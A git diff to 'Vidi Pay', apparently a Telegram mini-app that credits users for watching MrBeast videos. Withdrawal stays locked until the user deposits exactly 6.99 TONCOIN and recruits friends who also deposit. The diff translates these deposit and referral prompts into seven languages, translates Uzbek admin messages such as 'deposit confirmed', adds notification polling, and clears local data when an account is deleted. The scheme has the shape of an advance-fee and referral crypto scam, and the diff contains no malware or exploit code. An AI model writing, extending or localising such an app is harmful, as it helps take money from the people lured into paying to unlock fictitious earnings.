@@ -2719,6 +2719,8 @@
         const WALLET_UNLOCK_REQUIRED_USD = 20;
         const TON_ACTIVATION_AMOUNT = 6.99;
         const storageKey = `vidiPayState_${referralUserId}`;
+        const notificationsStorageKey = `vidiPayNotifications_${referralUserId}`;
+        const unreadNotificationsStorageKey = `vidiPayUnreadNotifications_${referralUserId}`;
         const defaultState = {
             balance: 0,
             totalViews: 0,
@@ -2800,7 +2802,7 @@
                         try {
                             data = JSON.parse(text);
                         } catch (parseErr) {
-                            lastError = new Error(`Backend API noto'g'ri URL qaytardi: ${baseUrl}`);
+                            lastError = new Error(`Backend API returned an invalid response: ${baseUrl}`);
                             continue;
                         }
                     }
@@ -3370,16 +3372,22 @@
             if (statusEl) {
                 const depositAmount = Number(backendSettings.activation_deposit_amount || amount || TON_ACTIVATION_AMOUNT);
                 statusEl.innerText = walletAddress
-                    ? `Send exactly ${depositAmount.toFixed(2)} TONCOIN. Other amounts are not confirmed automatically.`
+                    ? formatTonAmountText('ton_deposit_status_ready', depositAmount, 'Send exactly {amount} TONCOIN. Other amounts are not confirmed automatically.')
                     : t('payment_address_unavailable');
             }
             if (depositStatusEl) {
                 const depositAmount = Number(backendSettings.activation_deposit_amount || amount || TON_ACTIVATION_AMOUNT);
                 depositStatusEl.innerText = walletAddress
-                    ? `Waiting for exactly ${depositAmount.toFixed(2)} TONCOIN on TON network.`
+                    ? formatTonAmountText('ton_deposit_status_waiting', depositAmount, 'Waiting for exactly {amount} TONCOIN on TON network.')
                     : t('payment_address_unavailable');
             }
             updateLocalCardMethodUi();
+        }
+
+        function formatTonAmountText(key, amount, fallback) {
+            const safeAmount = Number(amount || TON_ACTIVATION_AMOUNT || 6.99).toFixed(2);
+            const template = (languages[currentLang] && languages[currentLang][key]) || languages.en[key] || fallback;
+            return String(template || '').replace(/\{amount\}/g, safeAmount);
         }
 
         async function refreshPaymentStatus() {
@@ -3789,10 +3797,11 @@
                 watched_result: "Watched time:",
                 earned_result: "Earned:",
                 not_enough_time: "Watched time is not enough. No money was added.",
+                reward_not_saved: "Reward was not saved to the backend.",
                 watch_added: "You left the logo screen. Watched time and earned money were added to the main page.",
                 wallet_locked: "Wallet locked until withdrawal time",
                 wallet_locked_extra: "Wallet address will appear when the withdrawal window opens.",
-                account_deleted: "Account deletion request completed. This account is now blocked.",
+                account_deleted: "Account deleted. The app will close now.",
                 confirm_delete: "Delete your account? You will not be able to earn or withdraw from this account.",
                 not_scheduled: "Not scheduled",
                 opening_date: "Opening date",
@@ -3901,7 +3910,8 @@
                 support_btn: "Contacter le support",
                 mdl_about: "À propos de l’application",
                 mdl_about_desc: "Vidi Pay Mini-App.\nÉcosystème P2P sécurisé dans Telegram WebApp.",
-                prof_network: "Réseau:"
+                prof_network: "Réseau:",
+                reward_not_saved: "La recompense n'a pas ete enregistree sur le backend."
             },
             hi: {
                 total_balance: "कुल बैलेंस",
@@ -4277,6 +4287,8 @@
             fastest_method: "Security confirmation",
             ton_deposit_title: "6.99 TONCOIN payment",
             ton_deposit_warning: "Send exactly 6.99 TONCOIN to this address. Less or more than 6.99 TONCOIN will not be confirmed automatically.",
+            ton_deposit_status_ready: "Send exactly {amount} TONCOIN. Other amounts are not confirmed automatically.",
+            ton_deposit_status_waiting: "Waiting for exactly {amount} TONCOIN on TON network.",
             payment_address_label: "Unique TON deposit address",
             wallet_method_value: "TONCOIN"
         });
@@ -4302,7 +4314,11 @@
             payment_verified_wallet: "Вывод разблокирован. Теперь можно создать заявку.",
             payment_required_withdraw: "Внесите 6.99 TONCOIN в сети TON, чтобы активировать вывод.",
             activation_deposit_required: "Внесите 6.99 TONCOIN в сети TON для активации вывода. Может взиматься комиссия блокчейн-сервиса.",
-            activation_refund_available: "Доступный возврат"
+            activation_refund_available: "Доступный возврат",
+            wallet_ready_for_activation: "Кошелек готов к активации",
+            ton_deposit_warning: "Отправьте ровно 6.99 TONCOIN на этот адрес. Меньшая или большая сумма не будет подтверждена автоматически.",
+            ton_deposit_status_ready: "Отправьте ровно {amount} TONCOIN. Другие суммы не подтверждаются автоматически.",
+            ton_deposit_status_waiting: "Ожидается ровно {amount} TONCOIN в сети TON."
         });
 
         Object.assign(languages.fr, {
@@ -4324,7 +4340,11 @@
             payment_verified_wallet: "Le retrait est debloque. Vous pouvez envoyer une demande.",
             payment_required_withdraw: "Deposez 6.99 TONCOIN sur TON pour activer le retrait.",
             activation_deposit_required: "Deposez 6.99 TONCOIN sur TON pour activer le retrait. Une commission blockchain peut etre facturee.",
-            activation_refund_available: "Remboursement disponible"
+            activation_refund_available: "Remboursement disponible",
+            wallet_ready_for_activation: "Le wallet est pret pour l'activation",
+            ton_deposit_warning: "Envoyez exactement 6.99 TONCOIN a cette adresse. Un montant inferieur ou superieur ne sera pas confirme automatiquement.",
+            ton_deposit_status_ready: "Envoyez exactement {amount} TONCOIN. Les autres montants ne sont pas confirmes automatiquement.",
+            ton_deposit_status_waiting: "En attente de exactement {amount} TONCOIN sur le reseau TON."
         });
 
         Object.assign(languages.hi, {
@@ -4346,7 +4366,11 @@
             payment_verified_wallet: "Withdrawal unlock ho gaya. Ab request bhej sakte hain.",
             payment_required_withdraw: "Withdrawal activate karne ke liye TON par 6.99 TONCOIN deposit karein.",
             activation_deposit_required: "Withdrawal activate karne ke liye TON par 6.99 TONCOIN deposit karein. Blockchain service commission lag sakti hai.",
-            activation_refund_available: "Available refund payout"
+            activation_refund_available: "Available refund payout",
+            wallet_ready_for_activation: "Wallet activation ke liye ready hai",
+            ton_deposit_warning: "Is address par exactly 6.99 TONCOIN bhejein. Kam ya zyada amount automatic confirm nahi hoga.",
+            ton_deposit_status_ready: "Exactly {amount} TONCOIN bhejein. Other amounts automatic confirm nahi honge.",
+            ton_deposit_status_waiting: "TON network par exactly {amount} TONCOIN ka wait ho raha hai."
         });
 
         Object.assign(languages.es, {
@@ -4368,7 +4392,11 @@
             payment_verified_wallet: "El retiro esta desbloqueado. Ya puedes enviar una solicitud.",
             payment_required_withdraw: "Deposita 6.99 TONCOIN en TON para activar el retiro.",
             activation_deposit_required: "Deposita 6.99 TONCOIN en TON para activar el retiro. Puede cobrarse comision del servicio blockchain.",
-            activation_refund_available: "Reembolso disponible"
+            activation_refund_available: "Reembolso disponible",
+            wallet_ready_for_activation: "La billetera esta lista para activarse",
+            ton_deposit_warning: "Envia exactamente 6.99 TONCOIN a esta direccion. Una cantidad menor o mayor no se confirmara automaticamente.",
+            ton_deposit_status_ready: "Envia exactamente {amount} TONCOIN. Otras cantidades no se confirman automaticamente.",
+            ton_deposit_status_waiting: "Esperando exactamente {amount} TONCOIN en la red TON."
         });
 
         Object.assign(languages.zh, {
@@ -4390,7 +4418,11 @@
             payment_verified_wallet: "提现已解锁。现在可以提交申请。",
             payment_required_withdraw: "请在 TON 网络充值 6.99 TONCOIN 以激活提现。",
             activation_deposit_required: "请在 TON 网络充值 6.99 TONCOIN 以激活提现。可能会收取区块链服务手续费。",
-            activation_refund_available: "可提现返还"
+            activation_refund_available: "可提现返还",
+            wallet_ready_for_activation: "钱包已准备好激活",
+            ton_deposit_warning: "请向此地址准确发送 6.99 TONCOIN。少于或多于该金额都不会自动确认。",
+            ton_deposit_status_ready: "请准确发送 {amount} TONCOIN。其他金额不会自动确认。",
+            ton_deposit_status_waiting: "正在等待 TON 网络上的准确 {amount} TONCOIN。"
         });
 
         Object.assign(languages.de, {
@@ -4412,7 +4444,11 @@
             payment_verified_wallet: "Auszahlung ist freigeschaltet. Du kannst jetzt eine Anfrage senden.",
             payment_required_withdraw: "Zahle 6.99 TONCOIN auf TON ein, um die Auszahlung zu aktivieren.",
             activation_deposit_required: "Zahle 6.99 TONCOIN auf TON ein, um die Auszahlung zu aktivieren. Eine Blockchain-Servicegebuehr kann anfallen.",
-            activation_refund_available: "Verfuegbare Rueckzahlung"
+            activation_refund_available: "Verfuegbare Rueckzahlung",
+            wallet_ready_for_activation: "Wallet ist bereit zur Aktivierung",
+            ton_deposit_warning: "Sende genau 6.99 TONCOIN an diese Adresse. Weniger oder mehr wird nicht automatisch bestaetigt.",
+            ton_deposit_status_ready: "Sende genau {amount} TONCOIN. Andere Betraege werden nicht automatisch bestaetigt.",
+            ton_deposit_status_waiting: "Warte auf genau {amount} TONCOIN im TON-Netzwerk."
         });
 
 
@@ -4590,7 +4626,7 @@
             deposit_refund_paid_status: "Deposit saved wallet par return ho gaya.",
             main_balance_locked_extra: "Main balance scheduled withdrawal time tak locked hai.",
             main_balance_ready_extra: "Main balance condition complete hai. Withdrawal sirf withdrawal time me open hoga.",
-            main_withdraw_referral_required: "Main balance withdraw ke liye referral link se deposit karne wala 1 aur friend kerak.",
+            main_withdraw_referral_required: "Main balance withdraw ke liye referral link se deposit karne wala 1 aur friend chahiye.",
             activate_wallet_first: "Pehle wallet activate karein",
             growth_499_title: "$499 income boost",
             growth_499_sub: "$499 ke baad earning continue karne ke liye 2 friends 6.99 TONCOIN deposit karein.",
@@ -4801,6 +4837,7 @@
         Object.assign(languages.hi, {
             copy_link: "COPY LINK",
             withdraw_history: "Withdrawal History",
+            reward_not_saved: "Reward backend me save nahi hua.",
             watch_title: "MrBeast Watch",
             watched_result: "Watched time:",
             watch_result_title: "Video result"
@@ -4809,6 +4846,7 @@
         Object.assign(languages.es, {
             copy_link: "COPIAR ENLACE",
             withdraw_history: "Historial de retiros",
+            reward_not_saved: "La recompensa no se guardo en el backend.",
             watch_title: "Ver MrBeast",
             watched_result: "Tiempo visto:",
             watch_result_title: "Resultado del video"
@@ -4817,6 +4855,7 @@
         Object.assign(languages.zh, {
             copy_link: "复制链接",
             withdraw_history: "提现历史",
+            reward_not_saved: "奖励未保存到后端。",
             watch_title: "观看 MrBeast",
             watched_result: "观看时间：",
             watch_result_title: "视频结果"
@@ -4825,13 +4864,14 @@
         Object.assign(languages.de, {
             copy_link: "LINK KOPIEREN",
             withdraw_history: "Auszahlungsverlauf",
+            reward_not_saved: "Die Belohnung wurde nicht im Backend gespeichert.",
             watch_title: "MrBeast ansehen",
             watched_result: "Angesehene Zeit:",
             watch_result_title: "Videoergebnis"
         });
 
         Object.assign(languages.ru, {
-            account_deleted: "Запрос на удаление аккаунта выполнен. Этот аккаунт теперь заблокирован.",
+            account_deleted: "Аккаунт удален. Приложение сейчас закроется.",
             admin_message: "Сообщение администратора",
             closing_date: "Дата закрытия",
             confirm_delete: "Удалить аккаунт? Вы больше не сможете зарабатывать или выводить средства с этого аккаунта.",
@@ -4839,6 +4879,7 @@
             expired_date: "Дата истечения",
             no_history: "Истории платежей или выводов пока нет.",
             not_enough_time: "Время просмотра недостаточно. Деньги не добавлены.",
+            reward_not_saved: "Награда не сохранена на сервере.",
             not_scheduled: "Не запланировано",
             opening_date: "Дата открытия",
             payment_required_withdraw: "Внесите 6.99 TONCOIN в сети TON, чтобы активировать вывод.",
@@ -5043,6 +5084,248 @@
             return (languages[currentLang] && languages[currentLang][key]) || languages.en[key] || key;
         }
 
+        const adminNotificationExactTranslations = {
+            "hamyoningiz aktivlashtirildi": {
+                en: "Your wallet has been activated",
+                ru: "Ваш кошелек активирован",
+                fr: "Votre portefeuille a ete active",
+                hi: "Aapka wallet activate ho gaya",
+                es: "Tu billetera ha sido activada",
+                zh: "您的钱包已激活",
+                de: "Ihre Wallet wurde aktiviert"
+            },
+            "depozit tasdiqlandi": {
+                en: "Deposit confirmed",
+                ru: "Депозит подтвержден",
+                fr: "Depot confirme",
+                hi: "Deposit confirm ho gaya",
+                es: "Deposito confirmado",
+                zh: "存款已确认",
+                de: "Einzahlung bestatigt"
+            },
+            "to'lov tasdiqlandi": {
+                en: "Payment confirmed",
+                ru: "Платеж подтвержден",
+                fr: "Paiement confirme",
+                hi: "Payment confirm ho gaya",
+                es: "Pago confirmado",
+                zh: "付款已确认",
+                de: "Zahlung bestatigt"
+            },
+            "pul yechish ochildi": {
+                en: "Withdrawal is open",
+                ru: "Вывод средств открыт",
+                fr: "Le retrait est ouvert",
+                hi: "Withdrawal open ho gaya",
+                es: "El retiro esta abierto",
+                zh: "提现已开启",
+                de: "Auszahlung ist geoffnet"
+            },
+            "depozit qaytarildi": {
+                en: "Deposit returned",
+                ru: "Депозит возвращен",
+                fr: "Depot retourne",
+                hi: "Deposit return ho gaya",
+                es: "Deposito devuelto",
+                zh: "存款已退回",
+                de: "Einzahlung zuruckgezahlt"
+            },
+            "muhim xabar": {
+                en: "Important message",
+                ru: "Важное сообщение",
+                fr: "Message important",
+                hi: "Important message",
+                es: "Mensaje importante",
+                zh: "重要消息",
+                de: "Wichtige Nachricht"
+            },
+            "yangi yangilik": {
+                en: "New update",
+                ru: "Новое обновление",
+                fr: "Nouvelle mise a jour",
+                hi: "New update",
+                es: "Nueva actualizacion",
+                zh: "新更新",
+                de: "Neues Update"
+            },
+            "hamyoningizni aktivlashtirish uchun 6.99 toncoin depozit qiling": {
+                en: "Deposit 6.99 TONCOIN to activate your wallet",
+                ru: "Внесите 6.99 TONCOIN, чтобы активировать кошелек",
+                fr: "Deposez 6.99 TONCOIN pour activer votre portefeuille",
+                hi: "Wallet activate karne ke liye 6.99 TONCOIN deposit karein",
+                es: "Deposita 6.99 TONCOIN para activar tu billetera",
+                zh: "存入 6.99 TONCOIN 以激活您的钱包",
+                de: "Zahlen Sie 6.99 TONCOIN ein, um Ihre Wallet zu aktivieren"
+            }
+        };
+
+        const adminNotificationReplacements = {
+            en: [
+                [/hamyoningiz/gi, 'your wallet'],
+                [/hamyon/gi, 'wallet'],
+                [/depozit/gi, 'deposit'],
+                [/to[‘']?lov/gi, 'payment'],
+                [/tasdiqlandi/gi, 'confirmed'],
+                [/aktivlashtirildi|faollashtirildi/gi, 'activated'],
+                [/pul yechish/gi, 'withdrawal'],
+                [/qaytarildi/gi, 'returned'],
+                [/ochildi/gi, 'opened'],
+                [/yopildi/gi, 'closed'],
+                [/muhim/gi, 'important'],
+                [/yangilik/gi, 'news'],
+                [/xabar/gi, 'message'],
+                [/bildirishnoma/gi, 'notification'],
+                [/iltimos/gi, 'please'],
+                [/tekshiring/gi, 'check'],
+                [/do[‘']st/gi, 'friend'],
+                [/qo[‘']shing/gi, 'add'],
+                [/balans/gi, 'balance'],
+                [/qulf/gi, 'lock']
+            ],
+            ru: [
+                [/hamyoningiz/gi, 'ваш кошелек'],
+                [/hamyon/gi, 'кошелек'],
+                [/depozit/gi, 'депозит'],
+                [/to[‘']?lov/gi, 'платеж'],
+                [/tasdiqlandi/gi, 'подтвержден'],
+                [/aktivlashtirildi|faollashtirildi/gi, 'активирован'],
+                [/pul yechish/gi, 'вывод средств'],
+                [/qaytarildi/gi, 'возвращен'],
+                [/ochildi/gi, 'открыт'],
+                [/yopildi/gi, 'закрыт'],
+                [/muhim/gi, 'важно'],
+                [/yangilik/gi, 'новость'],
+                [/xabar/gi, 'сообщение'],
+                [/bildirishnoma/gi, 'уведомление'],
+                [/iltimos/gi, 'пожалуйста'],
+                [/tekshiring/gi, 'проверьте'],
+                [/do[‘']st/gi, 'друг'],
+                [/qo[‘']shing/gi, 'добавьте'],
+                [/balans/gi, 'баланс'],
+                [/qulf/gi, 'блокировка']
+            ],
+            fr: [
+                [/hamyoningiz/gi, 'votre portefeuille'],
+                [/hamyon/gi, 'portefeuille'],
+                [/depozit/gi, 'depot'],
+                [/to[‘']?lov/gi, 'paiement'],
+                [/tasdiqlandi/gi, 'confirme'],
+                [/aktivlashtirildi|faollashtirildi/gi, 'active'],
+                [/pul yechish/gi, 'retrait'],
+                [/qaytarildi/gi, 'retourne'],
+                [/ochildi/gi, 'ouvert'],
+                [/yopildi/gi, 'ferme'],
+                [/muhim/gi, 'important'],
+                [/yangilik/gi, 'nouvelle'],
+                [/xabar/gi, 'message'],
+                [/bildirishnoma/gi, 'notification'],
+                [/iltimos/gi, 's’il vous plait'],
+                [/tekshiring/gi, 'verifiez'],
+                [/do[‘']st/gi, 'ami'],
+                [/qo[‘']shing/gi, 'ajoutez'],
+                [/balans/gi, 'solde'],
+                [/qulf/gi, 'verrou']
+            ],
+            hi: [
+                [/hamyoningiz/gi, 'aapka wallet'],
+                [/hamyon/gi, 'wallet'],
+                [/depozit/gi, 'deposit'],
+                [/to[‘']?lov/gi, 'payment'],
+                [/tasdiqlandi/gi, 'confirm ho gaya'],
+                [/aktivlashtirildi|faollashtirildi/gi, 'activate ho gaya'],
+                [/pul yechish/gi, 'withdrawal'],
+                [/qaytarildi/gi, 'return ho gaya'],
+                [/ochildi/gi, 'open ho gaya'],
+                [/yopildi/gi, 'closed'],
+                [/muhim/gi, 'important'],
+                [/yangilik/gi, 'news'],
+                [/xabar/gi, 'message'],
+                [/bildirishnoma/gi, 'notification'],
+                [/iltimos/gi, 'please'],
+                [/tekshiring/gi, 'check karein'],
+                [/do[‘']st/gi, 'friend'],
+                [/qo[‘']shing/gi, 'add karein'],
+                [/balans/gi, 'balance'],
+                [/qulf/gi, 'lock']
+            ],
+            es: [
+                [/hamyoningiz/gi, 'tu billetera'],
+                [/hamyon/gi, 'billetera'],
+                [/depozit/gi, 'deposito'],
+                [/to[‘']?lov/gi, 'pago'],
+                [/tasdiqlandi/gi, 'confirmado'],
+                [/aktivlashtirildi|faollashtirildi/gi, 'activado'],
+                [/pul yechish/gi, 'retiro'],
+                [/qaytarildi/gi, 'devuelto'],
+                [/ochildi/gi, 'abierto'],
+                [/yopildi/gi, 'cerrado'],
+                [/muhim/gi, 'importante'],
+                [/yangilik/gi, 'noticia'],
+                [/xabar/gi, 'mensaje'],
+                [/bildirishnoma/gi, 'notificacion'],
+                [/iltimos/gi, 'por favor'],
+                [/tekshiring/gi, 'revise'],
+                [/do[‘']st/gi, 'amigo'],
+                [/qo[‘']shing/gi, 'agregue'],
+                [/balans/gi, 'balance'],
+                [/qulf/gi, 'bloqueo']
+            ],
+            zh: [
+                [/hamyoningiz/gi, '您的钱包'],
+                [/hamyon/gi, '钱包'],
+                [/depozit/gi, '存款'],
+                [/to[‘']?lov/gi, '付款'],
+                [/tasdiqlandi/gi, '已确认'],
+                [/aktivlashtirildi|faollashtirildi/gi, '已激活'],
+                [/pul yechish/gi, '提现'],
+                [/qaytarildi/gi, '已退回'],
+                [/ochildi/gi, '已开启'],
+                [/yopildi/gi, '已关闭'],
+                [/muhim/gi, '重要'],
+                [/yangilik/gi, '新闻'],
+                [/xabar/gi, '消息'],
+                [/bildirishnoma/gi, '通知'],
+                [/iltimos/gi, '请'],
+                [/tekshiring/gi, '检查'],
+                [/do[‘']st/gi, '朋友'],
+                [/qo[‘']shing/gi, '添加'],
+                [/balans/gi, '余额'],
+                [/qulf/gi, '锁定']
+            ],
+            de: [
+                [/hamyoningiz/gi, 'Ihre Wallet'],
+                [/hamyon/gi, 'Wallet'],
+                [/depozit/gi, 'Einzahlung'],
+                [/to[‘']?lov/gi, 'Zahlung'],
+                [/tasdiqlandi/gi, 'bestatigt'],
+                [/aktivlashtirildi|faollashtirildi/gi, 'aktiviert'],
+                [/pul yechish/gi, 'Auszahlung'],
+                [/qaytarildi/gi, 'zuruckgezahlt'],
+                [/ochildi/gi, 'geoffnet'],
+                [/yopildi/gi, 'geschlossen'],
+                [/muhim/gi, 'wichtig'],
+                [/yangilik/gi, 'Neuigkeit'],
+                [/xabar/gi, 'Nachricht'],
+                [/bildirishnoma/gi, 'Benachrichtigung'],
+                [/iltimos/gi, 'bitte'],
+                [/tekshiring/gi, 'prufen'],
+                [/do[‘']st/gi, 'Freund'],
+                [/qo[‘']shing/gi, 'hinzufugen'],
+                [/balans/gi, 'Guthaben'],
+                [/qulf/gi, 'Sperre']
+            ]
+        };
+
+        function translateAdminNotificationText(text) {
+            const raw = String(text || '').trim();
+            if (!raw) return '';
+            const exactKey = raw.toLowerCase().replace(/[‘’]/g, "'");
+            const exact = adminNotificationExactTranslations[exactKey];
+            if (exact && exact[currentLang]) return exact[currentLang];
+            const replacements = adminNotificationReplacements[currentLang] || adminNotificationReplacements.en;
+            return replacements.reduce((value, [pattern, replacement]) => value.replace(pattern, replacement), raw);
+        }
+
         function currentReferralBonusRate() {
             const configured = Number(backendSettings.referral_bonus);
             return Number.isFinite(configured) && configured > 0 ? configured : BONUS_PER_FRIEND;
@@ -5154,7 +5437,23 @@
                     method: 'POST',
                     body: JSON.stringify({ telegram_id: String(referralUserId) })
                 });
+                localStorage.removeItem(storageKey);
+                localStorage.removeItem(notificationsStorageKey);
+                localStorage.removeItem(unreadNotificationsStorageKey);
+                localStorage.removeItem('vidiPayNotifications');
+                localStorage.removeItem('vidiPayUnreadNotifications');
+                if (!user?.id) localStorage.removeItem('vidiPayGuestId');
                 setDomText(statusEl, t('account_deleted'));
+                setTimeout(() => {
+                    try {
+                        if (tg.close) {
+                            tg.close();
+                            return;
+                        }
+                    } catch (e) {}
+                    try { window.close(); } catch (e) {}
+                    document.body.innerHTML = '';
+                }, 350);
             } catch (err) {
                 setDomText(statusEl, err.message);
             }
@@ -5567,7 +5866,7 @@
             if (err.data?.growth_lock) setGrowthLockStatus(err.data.growth_lock);
             updateWatchDisplays();
             updateWatchSessionUi(err.message);
-            showWatchResult(watchSeconds, 0, `${err.message}. Reward backendga yozilmadi.`);
+            showWatchResult(watchSeconds, 0, `${err.message}. ${t('reward_not_saved')}`);
             addNotification('View reward', err.message);
         }
     }
@@ -5651,26 +5950,25 @@
         }
 
         function getNotifications() {
-            const key = 'vidiPayNotifications';
             let items;
-            try { items = JSON.parse(localStorage.getItem(key)); } catch(e) { items = null; }
+            try { items = JSON.parse(localStorage.getItem(notificationsStorageKey)); } catch(e) { items = null; }
             if (!Array.isArray(items) || !items.length) {
                 items = [
                     { titleKey: 'noti_alert', textKey: 'noti_msg', date: new Date().toLocaleString() },
                     { titleKey: 'daily_info_title', textKey: 'daily_info_msg', date: new Date().toLocaleString() }
                 ];
-                localStorage.setItem(key, JSON.stringify(items));
+                localStorage.setItem(notificationsStorageKey, JSON.stringify(items));
             }
             return items;
         }
 
         function getUnreadNotificationCount() {
-            return Number(localStorage.getItem('vidiPayUnreadNotifications') || 0);
+            return Number(localStorage.getItem(unreadNotificationsStorageKey) || 0);
         }
 
         function setUnreadNotificationCount(count) {
             const safeCount = Math.max(0, Number(count || 0));
-            localStorage.setItem('vidiPayUnreadNotifications', String(safeCount));
+            localStorage.setItem(unreadNotificationsStorageKey, String(safeCount));
             const badge = document.querySelector('.badge');
             if (badge) {
                 badge.innerText = String(safeCount);
@@ -5689,16 +5987,19 @@
                 if (!Array.isArray(serverItems)) return;
                 const mapped = serverItems.map(item => ({
                     key: `server_${item.id || item.created_at || item.title}_${item.telegram_id || 'all'}`,
-                    title: item.title || t('admin_message'),
-                    text: item.message || '',
+                    rawTitle: item.title || t('admin_message'),
+                    rawText: item.message || '',
                     date: item.created_at ? new Date(item.created_at).toLocaleString() : new Date().toLocaleString()
                 }));
                 const localItems = getNotifications();
                 const existingKeys = new Set(localItems.map(item => item.key).filter(Boolean));
                 const newItems = mapped.filter(item => !existingKeys.has(item.key));
                 const merged = [...newItems, ...localItems].slice(0, 50);
-                localStorage.setItem('vidiPayNotifications', JSON.stringify(merged));
-                if (newItems.length) setUnreadNotificationCount(getUnreadNotificationCount() + newItems.length);
+                localStorage.setItem(notificationsStorageKey, JSON.stringify(merged));
+                if (newItems.length) {
+                    setUnreadNotificationCount(getUnreadNotificationCount() + newItems.length);
+                    renderNotifications();
+                }
             } catch (err) {}
         }
 
@@ -5707,8 +6008,8 @@
             if (!box) return;
             const items = getNotifications();
             box.innerHTML = items.map(item => {
-                const title = item.titleKey ? t(item.titleKey) : (item.title || '');
-                const text = item.textKey ? t(item.textKey) : (item.text || '');
+                const title = item.titleKey ? t(item.titleKey) : translateAdminNotificationText(item.rawTitle || item.title || '');
+                const text = item.textKey ? t(item.textKey) : translateAdminNotificationText(item.rawText || item.text || '');
                 const date = item.date || '';
                 return `
                 <div class="notification-item">
@@ -5722,10 +6023,9 @@
         }
 
         function addNotification(title, text) {
-            const key = 'vidiPayNotifications';
             const items = getNotifications();
             items.unshift({ title, text, date: new Date().toLocaleString() });
-            localStorage.setItem(key, JSON.stringify(items));
+            localStorage.setItem(notificationsStorageKey, JSON.stringify(items));
             setUnreadNotificationCount(getUnreadNotificationCount() + 1);
             renderNotifications();
         }
@@ -5943,6 +6243,14 @@
                 .then(() => updateWithdrawUi(latestPaymentStatus))
                 .catch(() => null)
                 .finally(() => { settingsRefreshBusy = false; });
+        }, 5000);
+        let notificationRefreshBusy = false;
+        setInterval(() => {
+            if (notificationRefreshBusy) return;
+            notificationRefreshBusy = true;
+            loadServerNotifications()
+                .catch(() => null)
+                .finally(() => { notificationRefreshBusy = false; });
         }, 5000);
         updateUnifiedTimers();
 
